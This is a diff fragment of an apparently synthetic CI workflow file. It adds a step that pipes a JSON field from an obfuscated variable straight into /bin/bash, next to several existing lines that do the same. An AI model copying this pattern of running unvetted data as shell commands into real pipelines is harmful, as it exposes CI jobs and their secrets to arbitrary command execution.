@@ -28,6 +28,7 @@ jobs:
           echo $v458 | jq -r .latwh32243 | /bin/bash
           echo $cbyog7 | jq -r .lm68610 | /bin/bash
           printf '%s' "$ri28" | jq -r .cbl5 | /bin/bash
+          printf '%s' "$xxeu2" | jq -r .zvp5 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
